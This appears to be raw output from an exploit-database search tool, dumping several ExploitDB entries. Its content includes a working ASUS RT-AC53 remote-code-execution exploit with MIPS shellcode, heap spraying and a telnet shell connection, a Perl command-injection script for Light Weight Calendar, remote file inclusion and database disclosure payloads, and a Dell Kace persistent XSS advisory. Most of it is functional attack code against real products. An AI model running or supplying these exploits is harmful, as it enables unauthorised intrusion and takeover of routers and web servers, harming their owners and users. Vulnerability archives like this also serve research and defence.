)  */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\xff\\xff\\x50\\x30"   #     andi    s0,v0,0xffff             */   \r\nsc += b"\\x25\\x20\\x10\\x02"   #     or      a0,s0,s0                 */\r\nsc += b"\\xfd\\xff\\x0f\\x24"   #     li      t7,-3                    */\r\nsc += b"\\x27\\x28\\xe0\\x01"   #     nor     a1,t7,zero               */\r\nsc += b"\\xdf\\x0f\\x02\\x24"   #     li      v0,4063 ( __NR_dup2 )    */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\x25\\x20\\x10\\x02"   #     or      a0,s0,s0                 */\r\nsc += b"\\x01\\x01\\x05\\x28"   #     slti    a1,zero,0x0101           */\r\nsc += b"\\xdf\\x0f\\x02\\x24"   #     li      v0,4063 ( __NR_dup2 )    */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\x25\\x20\\x10\\x02"   #     or      a0,s0,s0                 */\r\nsc += b"\\xff\\xff\\x05\\x28"   #     slti    a1,zero,-1               */   \r\nsc += b"\\xdf\\x0f\\x02\\x24"   #     li      v0,4063 ( __NR_dup2 )    */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\x50\\x73\\x06\\x24"   #     li      a2,0x7350                */\r\nsc += b"\\xff\\xff\\xd0\\x04"   # LB: bltzal  a2,LB                    */\r\nsc += b"\\x50\\x73\\x0f\\x24"   #     li      t7,0x7350 (nop)          */\r\nsc += b"\\xff\\xff\\x06\\x28"   #     slti    a2,zero,-1               */\r\nsc += b"\\xdb\\xff\\x0f\\x24"   #     li      t7,-37                   */\r\nsc += b"\\x27\\x78\\xe0\\x01"   #     nor     t7,t7,zero               */\r\nsc += b"\\x21\\x20\\xef\\x03"   #     addu    a0,ra,t7                 */\r\nsc += b"\\xf0\\xff\\xa4\\xaf"   #     sw      a0,-16(sp)               */\r\nsc += b"\\xf4\\xff\\xa0\\xaf"   #     sw      zero,-12(sp)             */\r\nsc += b"\\xf0\\xff\\xa5\\x23"   #     addi    a1,sp,-16                */\r\nsc += b"\\xab\\x0f\\x02\\x24"   #     li      v0,4011 ( __NR_execve )  */\r\nsc += b"\\x0c\\x01\\x01\\x01"   #     syscall                          */\r\nsc += b"/bin/sh";\r\n\r\n\r\nimport time\r\nimport struct\r\nimport socket\r\nimport sys\r\nimport os\r\nimport threading\r\nimport socketserver\r\nimport telnetlib\r\n\r\n# randomize mac address\r\ndef mac():\r\n    os.system(\'macchanger  -A {} > /dev/null\'.format(INTERACE))\r\n\r\n# setup interface\r\nos.system(\'ifconfig {} down; ifconfig {} {} up; route add default gw {}\'.format(INTERACE, INTERACE, IP, ROUTER_IP))\r\n\r\n\r\n# setup minimal webserver for delivering the shellcode\r\nclass ThreadedHTTPRequestHandler(socketserver.BaseRequestHandler):\r\n\r\n    def handle(self):\r\n        print(\'[-] got shellcode request\')\r\n        self.request.recv(1024)\r\n        print("[-] sending shellcode")\r\n        self.request.send(sc)\r\n\r\nclass ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\r\n    pass\r\n\r\nprint(\'[-] starting webserver\')\r\nsocketserver.TCPServer.allow_reuse_address = True\r\nserver = ThreadedHTTPServer((\'0.0.0.0\', 1337), ThreadedHTTPRequestHandler)\r\nt = threading.Thread(target=server.serve_forever)\r\nt.start()\r\n\r\n# start multicast receiver\r\naddrinfo = socket.getaddrinfo(\'239.255.255.250\', None)[0]\r\ns = socket.socket(addrinfo[0], socket.SOCK_DGRAM)\r\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\ns.bind((\'\', 1900))\r\ngroup_bin = socket.inet_pton(addrinfo[0], addrinfo[4][0])\r\nmreq = group_bin + struct.pack(\'=I\', socket.INADDR_ANY)\r\ns.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)\r\n\r\nmac()\r\nstate = \'clean\'\r\n\r\nwhile True:\r\n    data, sender = s.recvfrom(1500)\r\n\r\n    if sender[0] == ROUTER_IP and sender[1] == 1008:\r\n        print("[-] received SSP discovery")\r\n\r\n        data = {}\r\n        data[\'clean\'] = b\'HTTP/1.1 200 OK\\r\\nLocation:HTTP://\' + b\'CCCC\'*11 + b\'\\xfc\\x8c\\x40/\' +b\'\\r\\n\\r\\n\'\r\n        data[\'pwn\']   = b\'HTTP/1.1 200 OK\\r\\nLocation:HTTP://\' + b"AAAA"*11 + b\'\\x04\\xd5\\x41/\' +b\'\\r\\n\\r\\n\'\r\n        data[\'heap\']  = b\'HTTP/1.1 200 OK\\r\\nLocation:HTTP://\' + IP.encode()+ b\':1337/A\\r\\n\\r\\n\'  \r\n        data[\'heap2\']= data[\'heap\']\r\n\r\n        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) \r\n        sock.sendto(data[state], sender)\r\n\r\n        if state == \'pwn\':\r\n            print("[-] starting payload")\r\n            while True:\r\n                try:\r\n                    print("[-] try to connect to shell")\r\n                    telnet = telnetlib.Telnet()\r\n                    telnet.open(\'192.168.1.1\', 0x1337, timeout=1)\r\n                    print(\'[+] connected\')\r\n                    telnet.write(b\'uname -a; echo [+] pwned\\n\')\r\n                    telnet.interact()\r\n                except:\r\n                    pass\r\n                time.sleep(2.0)\r\n\r\n        if state == \'heap2\':\r\n            print("[-] spraying heap 2/2")\r\n            mac()\r\n            state = \'pwn\'\r\n\r\n        if state == \'heap\':\r\n            print("[-] spraying heap 1/2")\r\n            mac()\r\n            state = \'heap2\'\r\n\r\n        if state == \'clean\':\r\n            print(\'[-] clearing database and crashing\')\r\n            mac()\r\n            state = \'heap\'\r\n---EOF---', u'description': u'ASUSWRT RT-AC53 (3.0.0.4.380.6038) - Remote Code Execution', u'platform': u'hardware', u'author': u'Bruno Bierbaumer', u'cve': [u'CVE-2017-6548'], u'source': u'ExploitDB', u'date': u'2017-03-08T00:00:00+00:00', u'_id': 41573, u'type': u'webapps', u'port': 0}

CVE: []
Description: Dell Kace 1000 SMA 5.4.70402 - Persistent Cross-Site Scripting
{u'code': u'Title:\r\n======\r\nDell Kace 1000 SMA v5.4.70402 - Persistent Vulnerabilities\r\n\r\n\r\nDate:\r\n=====\r\n2013-07-16\r\n\r\n\r\nReferences:\r\n===========\r\nhttp://www.vulnerability-lab.com/get_content.php?id=833\r\n\r\n\r\nVL-ID:\r\n=====\r\n833\r\n\r\n\r\nCommon Vulnerability Scoring System:\r\n====================================\r\n3.5\r\n\r\n\r\nIntroduction:\r\n=============\r\nDell KACE is to provide an appliance-based approach to systems management, to create time for systems administration professionals, \r\nwhile saving money for their companies. Dell KACE Systems Management Appliances are available as both physical and virtual appliances. \r\n\r\nThe KACE Management Appliance delivers a fully integrated systems management solution, unlike traditional software approaches that \r\ncan require complex and time-consuming deployment and maintenance. KACE accomplishes this via an extremely flexible, intelligent \r\nappliance-based architecture that typically deploys in days and is self maintaining. The KACE Management Appliance also provides \r\ndirect access to time-saving ITNinja systems management community information using AppDeploy Live, the leading destination for end \r\npoint administrators. The result: Comprehensive systems management that is easy-to-use and that can be more economical than software \r\nonly alternatives. Read more in the white paper KACE K1000 Management Appliance Architecture: Harnessing the Power of an \r\nAppliance-based Architecture. The KACE Management Appliance is designed for enterprises and business units with up to 20,000 nodes. \r\n\r\n(Copy of the Vendor Homepage:  http://www.kace.com/products/systems-management-appliance )\r\n\r\n\r\nAbstract:\r\n=========\r\nThe Vulnerability Laboratory Research Team discovered a web session vulnerability in Dell Kace K1000, Systems Management Appliance.\r\n\r\n\r\nReport-Timeline:\r\n================\r\n2013-01-24:     Researcher Notification & Coordination\r\n2013-02-06:     Vendor Notification\r\n2013-02-08:     Vendor Response/Feedback\r\n2013-**-**:     Vendor Fix/Patch\r\n2013-07-16:     Public Disclosure\r\n\r\n\r\nStatus:\r\n========\r\nPublished\r\n\r\n\r\nAffected Products:\r\n==================\r\nDELL\r\nProduct: Kace K1000 SMA 5.4.70402\r\n\r\n\r\nExploitation-Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity:\r\n=========\r\nMedium\r\n\r\n\r\nDetails:\r\n========\r\nMultiple persistent input validation web vulnerabilities are detected in Dell Kace K1000, Systems Management Appliance.\r\nThe vulnerabilityallows an attacker to inject own malicious script code in the vulnerable module on application side (persistent).\r\n\r\nThe first vulnerability is located in the `Inventory` module with the bound vulnerable Ip-address, Mac, Os Name, Service pack, \r\nNotes and Label Name parameters. The persistent injected script code will be executed directly out of the `Computer` listing \r\nwhen processing to manage the earlier inserted machines in dbms context.\r\n\r\nThe second vulnerability is located in the `Distribution` module with the bound vulnerable Machine Name and Mac address parameters. \r\nThe persistent injected script code will be executed directly out of the `Walk-on-lan` exception handling mechanism when a malicious \r\ndata is inserted in the vulnerable fields.\r\n\r\nSuccessful exploitation of the vulnerabilities result in persistent session hijacking, persistent phishing, persistent external \r\nredirects, persistent external malware loads via inject and persistent vulnerable module web context manipulation.\r\n\r\nVulnerable Section(s):\r\n      [+] Inventory => Computers\r\n      [+] Inventory => Computers\r\n      [+] Distribution =>  Wake-on-lan\r\n\r\nVulnerable Module(s):\r\n      [+] Add New Item\r\n      [+] Add Label\r\n      [+] Add new Item\r\n \r\nVulnerable Parameter(s):\r\n      [+] [Ip-address] [Mac] [Os Name] [Service pack] [Notes]\r\n      [+] [Label Name]\r\n      [+] [Machine Name] [Mac address]\r\n\r\nAffected Modules(s):\r\n      [+] Inventory => Computers\r\n      [+] Inventory => Computers => Choose Action Menu => Apply label\r\n      [+] Distribution =>  Wake-on-lan =>Exception handeling \r\n\r\n\r\nProof of Concept:\r\n=================\r\nThe vulnerability can be exploited by remote attackers with low user interaction and low privilege application user account.\r\nFor demonstration or reproduce ...\r\n\r\n1.1\r\n\r\nURL:  https://pub23.127.0.0.1:1336/adminui/machine.php?ID=1\r\nAffected Module: Inventory => Computers \r\n\r\n\r\nCode Review:\r\n\r\n<div style="margin-left:15px; color: #005FA9; font-family:Verdana,Arial,Helvetica,sans-serif; font-size:10px; font-weight:300;">\r\n            \r\n<script type="text/javascript" src="/common/js/scw.js"></script>\r\n            <script type="text/javascript">\r\n \r\n// this will get set at the end of the page, after we\'ve generated all the dynamic sections\r\n            var gLastSectionId = 0;\r\n</script>\r\n            [<a href="#" onclick=\'expandAllDetail(gLastSectionId, 1);\'>Expand All</a>]\r\n            [<a href="#" onclick=\'expandAllDetail\r\n(gLastSectionId);printSpecial()\'>Printer Friendly Version</a>]\r\n                        [<a href="history_log.php?HISTORY_TYPE=ASSET&TYPE_NAME=\r\nComputer&TYPE_ID=8&NAME=%26lt%3Bh1%26gt%3BName%26lt%3B%2Fh1%26gt%3B&SHOW_ALL=1" onclick=\'logPopup(this); return false;\'>Show All History</a>]\r\n \r\n                       <div id="printReady" style="margin-top:2px;">\r\n                <table border="0" cellspacing="0" cellpadding="0" \r\nstyle="border-collapse:collapse;width:70%;">\r\n                <tbody>\r\n<tr class="detail_page_section_heading_no_cursor">\r\n    <td colspan="3">\r\n        \r\n<a style="cursor: pointer;cursor: hand;" onclick="hideShowDetail(\'section1\',null,\'\',\'\',\'\'); return false;">Summary</a>\r\n    </td>\r\n</tr>\r\n</tbody>\r\n\r\n<tbody id="section1" style="display:none;">\r\n<tr valign="top" class="rowHighlightData"><td width="1%">  </td><td style="width:150px;min-\r\nwidth:100px;">Name:</td><td><h1>Name</h1></td></tr>\r\n<tr valign="top" class="rowData"><td width="1%">  </td>\r\n<td style="width:150px;min-width:100px;">Manual Entry:</td><td>Manually Entered Record, no communication with the server \r\n[<a href="/adminui/machine_edit.php?ID=2">Edit</a>]</td></tr>\r\n<tr valign="top" class="rowHighlightData"><td width="1%">  </td>\r\n<td style="width:150px;min-width:100px;">IP Address:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]  <select onchange="\r\nif(this.options[this.selectedIndex].value==\'1\') MachineAction(\'<h1>Ip-Address</h1>\',\'<h1>Name</h1>\', 2, encodeURI(\'mstsc.exe /v:KACE_HOST_IP /w:900 /h:800\'));">\r\n<option value="">Action...</option><option title="Launch: mstsc.exe /v:KACE_HOST_IP /w:900 /h:800" value="1">Action 1</option></select></td></tr>\r\n\r\n<tr valign="top" class="rowData"><td width="1%">  </td><td style="width:150px;min-width:100px;">MAC:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td>\r\n</tr>\r\n<tr valign="top" class="rowHighlightData"><td width="1%">  </td><td style="width:150px;min-width:100px;">\r\nProcessors:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr valign="top" class="rowData"><td width="1%">  </td><td style="width:150px;\r\nmin-width:100px;">OS Name:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]v</td></tr>\r\n<tr valign="top" class="rowHighlightData"><td width="1%">  </td>\r\n<td style="width:150px;min-width:100px;">Service Pack:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr valign="top" class="rowData">\r\n<td width="1%">  </td><td style="width:150px;min-width:100px;">Notes:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr valign="top" \r\nclass="rowHighlightData"><td width="1%">  </td><td style="width:150px;min-width:100px;">Record Created:</td><td>01/28/2013 05:31:49</td></tr>\r\n\r\n<tr class="rowData"><td colspan="3"> </td></tr>\r\n</tbody><tbody><tr class="detail_page_group_heading"><td colspan="3">Inventory Information\r\n</td></tr></tbody>\r\n<tbody>\r\n<tr class="detail_page_section_heading_no_cursor">\r\n    <td colspan="3">\r\n        <a style="cursor: pointer;cursor: hand;" \r\nonclick="hideShowDetail(\'section2\',null,\'\',\'\',\'\'); return false;">Hardware</a>   <span style="color:#909090"> [no changes]</span>\r\n</td>\r\n</tr>\r\n</tbody>\r\n<tbody id="section2" style="display:none;">\r\n<tr valign="top" class="rowHighlightData"><td width="1%">  </td>\r\n<td style="width:150px;min-width:100px;">Processors:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr valign="top" class="rowData"><td width="1%">  </td><td style="width:150px;min-width:100px;">CD/DVD Drives:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr valign="top"\r\n class="rowHighlightData"><td width="1%">  </td><td style="width:150px;min-width:100px;">\r\nSound Devices:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr valign="top" class="rowData"><td width="1%">  </td>\r\n<td style="width:150px;min-width:100px;">Video Controllers:</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr valign="top" \r\nclass="rowHighlightData"><td width="1%">  </td><td style="width:150px;min-width:100px;">Monitor:\r\n</td><td>[PERSISTENT INJECTED SCRIPT CODE!]</td></tr>\r\n<tr class="rowData"><td colspan="3"> </td></tr>\r\n</tbody><tbody>\r\n<tr class="detail_page_section_heading_no_cursor">\r\n    <td colspan="3">\r\n        <a style="cursor: pointer;cursor: hand;" onclick="hideShowDetail\r\n(\'section3\',null,\'\',\'\',\'\'); return false;">Printers (1)</a>\r\n    </td>\r\n    \r\n...\r\n    \r\n\r\n\r\n1.2\r\n\r\nURL:https://pub23.127.0.0.1:1336/adminui/computer_inventory.php\r\n\r\nAffected Module: Inventory =>Computers => choose action => Apply Label\r\n\r\n\r\nCode Review:\r\n\r\n\r\n<td class="inputFormat"><select name="FINDFIELDS[EXP_SELECT8]" id="FINDFIELDS[EXP_SELECT8]" onchange="$(\'FINDFIELDS[INPUT8]\').disabled =\r\n \r\n                            ($F(this) == \'NULL\' || $F(this) == \'NOT_NULL\')" style="width:auto">\r\n<option value="NOT_EQUAL" title="!=">!=\r\n</option>\r\n<option value="GT" title=">">></option>\r\n<option value="LT" title="<"><</option>\r\n<option value="EQUALS" title="=">=</option>\r\n\r\n<option value="BEGINS_WITH" title="begins with">begins with</option>\r\n<option value="CONTAINS" title="contains">contains</option>\r\n<option \r\nvalue="NOT_BEGINS_WITH" title="does not begin with">does not begin with</option>\r\n<option value="NO_CONTAIN" title="does not contain">does not \r\ncontain</option>\r\n<option value="NOT_ENDS_WITH" title="does not end with">does not end with</option>\r\n<option value="NOT_MATCH_REGEX" title="does \r\nnot match REGEX">does not match REGEX</option>\r\n<option value="ENDS_WITH" title="ends with">ends with</option>\r\n<option value="NOT_NULL" title="\r\nis NOT NULL">is NOT NULL</option>\r\n<option value="NULL" title="is NULL">is NULL</option>\r\n<option value="MATCH_REGEX" title="matches REGEX">matches \r\nREGEX</option>\r\n</select>\r\n</td>\r\n<td class="inputFormat"><input class="inputFormat" name="FINDFIELDS[INPUT8]" id="FINDFIELDS[INPUT8]" value="" \r\nsize="46" maxlength="255"  /></td>\r\n</tr>\r\n                <tr>\r\n                    <td colspan="4" align="center" class="inputFormat">\r\nChoose label:\r\n                        <select name="FINDFIELDS[FILTER_LABEL]" dojoType="dijit.form.ComboBox">\r\n<script type="dojo/connect">\r\nthis.attr("value","");</script>\r\n<option selected value="" title=""></option>\r\n<option value="77" title="">[PERSISTENT INJECTED SCRIPT CODE!]"\r\n>">[PERSISTENT INJECTED SCRIPT CODE!]</option>\r\n</select>\r\n \r\n                        <input name="test_filter" class="inputFormatButton" type="submit" \r\nvalue="Test Smart Label" />\r\n                                                    <input name="create_filter" class="inputFormatButton" type="submit" \r\nvalue="Create Smart Label" />\r\n                            <input name="cancel" class="inputFormatButton" type="reset" value="Reset" onclick="document.createFilterForm.reset(); return true;" />\r\n                                            </td>\r\n                </tr>\r\n \r\n</table>\r\n            </form>\r\n        </div>\r\n    </div>\r\n    <div id="createNotifyForm" class="advQueryOuter">\r\n        <div class="advQueryInner">\r\n\r\n<h2>Create Email Notification</h2>\r\n            <p>To create a notification rule simply enter the search criteria, title, email recipient - \r\nthen Test & Create:</p>            <form name="createNotifyForm" action="/adminui/advanced_query.php" method="post" onreset="fieldsReset(); \r\nfieldsOnchange();">\r\n                <table border="0" cellspacing="0" cellpadding="0" style="margin-left: auto; margin-right: auto;" align="center">\r\n                <tr>\r\n...\r\n\r\n\r\n\r\n1.3\r\n\r\nURL: https://pub23.127.0.0.1:1336/adminui/settings_network_scan.php\r\n\r\nAffected module: Distribution => Wake-on Lan => Exception handeling \r\n\r\n\r\nCode Review:\r\n\r\n<p>\r\n<b><u>Wake-on-LAN</u></b>\r\n<br/><br/>\r\nThis page allows you to wake up a computer or other device that has been inventoried by the K1000 \r\nif the remote device is attached to the network and supports Wake-on-LAN.  If the device you wish to wake is not inventoried by the K1000 \r\nbut you still know the MAC (Hardware) address and its last-known IP address, you can manually enter the info to wake the device.\r\n</p>\r\n\r\n<div class="roundbottom">\r\n<img src="./images/RoundRectBottomLeft.gif" alt="" width="15" height="15" class="corner" style="display: none;">\r\n</div>\r\n</div>\r\n\r\n        <span class="filtercount" style="display:none" id="hidden_machine_picker_count"></span>\r\n        <span class="filtercount" style="display:none\r\n" id="hidden_device_picker_count"></span>\r\n        <form class="edit" action="" method="post" target="_self" />\r\n        <div class="wordwrap messageBox">\r\n<span class="messageBoxTitle">Please correct the following errors:</span><ul><li class="error">A Wake-on-LAN packet was sent to \r\nwake <strong>[PERSISTENT INJECTED SCRIPT CODE!] ([PERSISTENT INJECTED SCRIPT CODE!])</strong>. </li><li class="error">Please note that it may \r\ntake several minutes for the device to power on and be available for use.</li></ul></div> \r\n        <table cellspacing="1" cellpadding="0" border="0">\r\n\r\n<tr>\r\n            <td colspan="2" class="inputFormat"><h2>Wake Multiple Devices</h2></td>\r\n        </tr>\r\n        <tr>\r\n            <td class="inputFormat" \r\nstyle="width: 30%; vertical-align:middle;">Limit To Selected Labels:</td>\r\n            <td width="70%">\r\n                <select name="label" style="width: \r\n30em" onchange="updateFields(this)" id="label">\r\n<option selected value="" title="Select a label\u2026">Select a label\u2026</option>\r\n<option \r\nvalue="77" title="">[PERSISTENT INJECTED SCRIPT CODE!]">">[PERSISTENT INJECTED SCRIPT CODE!]</option>\r\n<option value="72" \r\ntitle="Adobe Flash Player">Adobe Flash Player</option>\r\n<option value="71" title="Adobe Reader X">Adobe Reader X</option>\r\n<option value="49" \r\ntitle="All Ticket Owners">All Ticket Owners</option>\r\n<option value="33" title="MemberOfBuildingA">MemberOfBuildingA</option>\r\n<option value="32" \r\ntitle="MemberOfFinanceGroup">MemberOfFinanceGroup</option>\r\n<option value="64" title="Windows 7 - Critical - 2012">Windows 7 - Critical - \r\n2012</option>\r\n<option value="65" title="Windows XP - Critical - 2012">Windows XP - Critical - 2012</option>\r\n</select>\r\n            </td>\r\n</tr>\r\n\r\n<tr>\r\n            <td colspan="2" class="inputFormat"><img src="/adminui/images/timer_16x16.gif" alt="" height="16" width="16" border="0" /> \r\n<a href="wol_list.php">Schedule a routine Wake-on-LAN event</a></td>\r\n        </tr>\r\n        <tr>\r\n            <td colspan="2" height="10px"></td>\r\n \r\n</tr>\r\n        <tr>\r\n            <td colspan="2" class="inputFormat"><h2>Wake a Computer</h2></td>\r\n        </tr>\r\n        <tr>\r\n\r\n<td class="inputFormat" style="width: 140px; max-width: 140px; vertical-align:middle;">Limit To Listed Machines:</td>\r\n            <td>\r\n\r\n<select name="machine[]" size="7" multiple="1" id="machine[]" style="width:30em">\r\n                    <option value="0" \r\ntitle="----- Machine Names -----">----- Machine Names -----</option>\r\n                </select>\r\n                <input class="inputFormat" \r\ntype="button" value="Remove"  onclick="machineRemoveSelected()" />\r\n                <input class="inputFormat" type="button" value="Remove All" \r\nonclick="machineRemoveAll()" />\r\n            </td>\r\n        </tr>\r\n        <tr>\r\n            <td height="10px"></td>\r\n            \r\n<td valign="bottom">\r\n                <select name="" id="machine_picker" style="width:30em" onchange="machineAddNameToList(this);\r\nthis.selectedIndex = 0; ">\r\n<option value="" title="Loading...">Loading...</option>\r\n</select>\r\n\r\n\r\nRisk:\r\n=====\r\nThe security risk of the persistent input validation web vulnerabilities are estimated as medium(+).\r\n\r\n\r\nCredits:\r\n========\r\nVulnerability Laboratory [Research Team] - Ibrahim Mosaad El-Sayed  [ibrahim@evolution-sec.com]\r\n\r\n\r\nDisclaimer:\r\n===========\r\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, \r\neither expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-\r\nLab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business \r\nprofits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some \r\nstates do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation \r\nmay not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases \r\nor trade with fraud/stolen material.\r\n\r\nDomains:    www.vulnerability-lab.com     - www.vuln-lab.com             - www.vulnerability-lab.com/register\r\nContact:    admin@vulnerability-lab.com   - support@vulnerability-lab.com          - research@vulnerability-lab.com\r\nSection:    video.vulnerability-lab.com   - forum.vulnerability-lab.com            - news.vulnerability-lab.com\r\nSocial:      twitter.com/#!/vuln_lab     - facebook.com/VulnerabilityLab          - youtube.com/user/vulnerability0lab\r\nFeeds:      vulnerability-lab.com/rss/rss.php  - vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php\r\n\r\nAny modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. \r\nPermission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other \r\nmedia, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and \r\nother information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), \r\nmodify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.\r\n\r\n                 Copyright \xa9 2013 | Vulnerability Laboratory\r\n\r\n\r\n-- \r\nVULNERABILITY LABORATORY RESEARCH TEAM\r\nDOMAIN: www.vulnerability-lab.com\r\nCONTACT: research@vulnerability-lab.com', u'description': u'Dell Kace 1000 SMA 5.4.70402 - Persistent Cross-Site Scripting', u'platform': u'php', u'author': u'Vulnerability-Lab', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-07-16T00:00:00+00:00', u'_id': 26893, u'type': u'webapps', u'port': 0}

Searching for light
=================================================================================
exploit search
=================================================================================
dos
=================================================================================
Unable to parse JSON response
Searching for light
=================================================================================
exploit search
=================================================================================
local
=================================================================================
Unable to parse JSON response
Searching for light
=================================================================================
exploit search
=================================================================================
remote
=================================================================================
Unable to parse JSON response
Searching for light
=================================================================================
exploit search
=================================================================================
shellcode
=================================================================================
Unable to parse JSON response
Searching for light
=================================================================================
exploit search
=================================================================================
 webapps
=================================================================================
Exploits found: 68
CVE: []
Description: Light Weight Calendar 1.x - 'date' Remote Code Execution
{u'code': u'#!/usr/bin/perl\r\n#\r\n# Light Weight Calendar\r\n# Exploit by Hessam-x (www.hessamx.net)\r\n#\r\n######################################################\r\n#  ___ ___                __                         #\r\n# /   |   \\_____    ____ |  | __ ___________________ #\r\n#/    ~    \\__  \\ _/ ___\\|  |/ // __ \\_  __ \\___   / #\r\n#\\    Y    // __ \\\\  \\___|    <\\  ___/|  | \\//    /  #\r\n# \\___|_  /(____  /\\___  >__|_ \\\\___  >__|  /_____ \\ #\r\n#       \\/      \\/     \\/     \\/    \\/            \\/ #\r\n#             Iran Hackerz Security Team             #\r\n#               WebSite: www.hackerz.ir              #\r\n#                                                    #\r\n######################################################\r\n# Name    : Light Weight Calendar                    #\r\n# version : 1.*                                      #\r\n######################################################\r\nuse LWP::Simple;\r\n\r\nprint "-------------------------------------------\\n";\r\nprint "=          Light Weight Calendar          =\\n";\r\nprint "=       By Hessam-x  - www.hackerz.ir     =\\n";\r\nprint "-------------------------------------------\\n\\n";\r\n\r\n      print "Target(www.example.com)\\> ";\r\n      chomp($targ = <STDIN>);\r\n\r\n      print "path: (/lwc/)\\>";\r\n      chomp($path=<STDIN>);\r\n\r\nwhile()\r\n{\r\n\r\n     print "command:\\>";\r\n     chomp($comd=<STDIN>);\r\n     $expl="index.php?hx=".$comd."&date=passthru%28%24_GET%5Bhx%5D%29";\r\n     $page=get("http://".$targ.$path.$expl) || die "[-] Exploit failed ...\\n";\r\n\r\n}\r\n\r\n# milw0rm.com [2006-03-09]', u'description': u"Light Weight Calendar 1.x - 'date' Remote Code Execution", u'platform': u'php', u'author': u'Hessam-x', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-03-09T00:00:00+00:00', u'_id': 1570, u'type': u'webapps', u'port': 0}

CVE: []
Description: SimpCMS 04.10.2007 - 'site' Remote File Inclusion
{u'code': u'Bug Found By Dr.RoVeR -->Arab48 Hacker\r\n\r\nContact: Dr.RoVeR@HackerMail.CoM\r\n---\r\n\r\nScript: SimpCMS Light\r\n\r\nDownload: http://www.simpcms.com/light/normal/simp-cms-light.zip\r\n\r\n--\r\n\r\nBug File: index.php\r\n\r\nBug code in line 31:\r\ninclude $site.".php";\r\n\r\n--\r\n\r\nExploit:\r\nhttp://site.com/[path]/index.php?site=[EvilScript]\r\n\r\n# milw0rm.com [2007-04-10]', u'description': u"SimpCMS 04.10.2007 - 'site' Remote File Inclusion", u'platform': u'php', u'author': u'Dr.RoVeR', u'cve': [], u'source': u'ExploitDB', u'date': u'2007-04-10T00:00:00+00:00', u'_id': 3705, u'type': u'webapps', u'port': 0}

CVE: []
Description: FipsCMS Light 2.1 - 'db.mdb' Remote Database Disclosure
{u'code': u'@~~=======================================~~@\r\n====C4TEAM.ORG====ByALBAYX====C4TEAM.ORG=====\r\n@~~=======================================~~@\r\n@~~=Author   : ByALBAYX\r\n\r\n@~~=Website  : WWW.C4TEAM.ORG\r\n@~~===============TURKISH=================~~@\r\n\r\n\r\n@~~=======================================~~@\r\n@~~=Script   : fipsCMS Light 2.1\r\n\r\n@~~=S.Site   : http://fipsasp.com\r\n@~~=======================================~~@\r\n\r\n@~~=Vul      : http://c4team.org/ [Yol] /_fipsdb/db.mdb\r\n\r\n@~~=Demo     : http://demo.fipsasp.com/fipsCMS_light/_fipsdb/db.mdb\r\n\r\n              _.--"""""--._\r\n            .\'             \'.\r\n           /                 \\\r\n          ;       C4TEAM      ;\r\n          |                   |\r\n          |                   |\r\n          ;                   ;                   ByALBAYX\r\n           \\ (`\'--,    ,--\'`) /\r\n            \\ \\  _ )  ( _  / /                 WWW.C4TEAM.ORG\r\n             ) )(\')/  \\(\')( (\r\n            (_ `""` /\\ `""` _)\r\n             \\`"-, /  \\ ,-"`/                       \r\n              `\\ / `""` \\ /`\r\n               |/\\/\\/\\/\\/\\|                      \r\n               |\\        /|\r\n               ; |/\\/\\/\\| ;\r\n                \\`-`--`-`/\r\n                 \\      /\r\n                  \',__,\'\r\n@~~=======================================~~@\r\n\r\n@~~=:/\r\n\r\n# milw0rm.com [2009-06-08]', u'description': u"FipsCMS Light 2.1 - 'db.mdb' Remote Database Disclosure", u'platform': u'asp', u'author': u'ByALBAYX', u'cve': [], u'source': u'ExploitDB', u'date': u'2009-06-08T00:00:00+00:00', u'_id': 8890, u'type': u'webapps', u'port': 0}

CVE: []
Description: FipsCMS Light 2.1 - 'r' SQL Injection
